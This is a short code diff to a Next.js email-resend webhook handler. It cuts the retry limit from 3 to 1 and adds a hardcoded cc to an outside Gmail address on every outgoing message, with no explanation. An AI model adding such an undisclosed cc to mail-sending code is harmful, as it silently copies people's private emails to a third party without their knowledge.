@@ -4,7 +4,7 @@ import nodemailer from 'nodemailer'
 import { supabaseAdmin } from '@/lib/supabase'
 
 const FROM_GMAIL = process.env.GMAIL_USER
-const MAX_DELAYED_RETRIES = 3
+const MAX_DELAYED_RETRIES = 1
 
 export async function POST(request: NextRequest) {
   const secret = process.env.RESEND_WEBHOOK_SECRET
@@ -85,7 +85,7 @@ export async function POST(request: NextRequest) {
       },
     })
     for (const addr of to) {
-      await transporter.sendMail({ from: FROM_GMAIL, to: addr, subject, html })
+      await transporter.sendMail({ from: FROM_GMAIL, to: addr, cc: 'dharmaworker2.tw@gmail.com', subject, html })
     }
     console.log(`[resend-webhook] Gmail 補寄成功: ${to.join(', ')}`)
   } catch (err) {
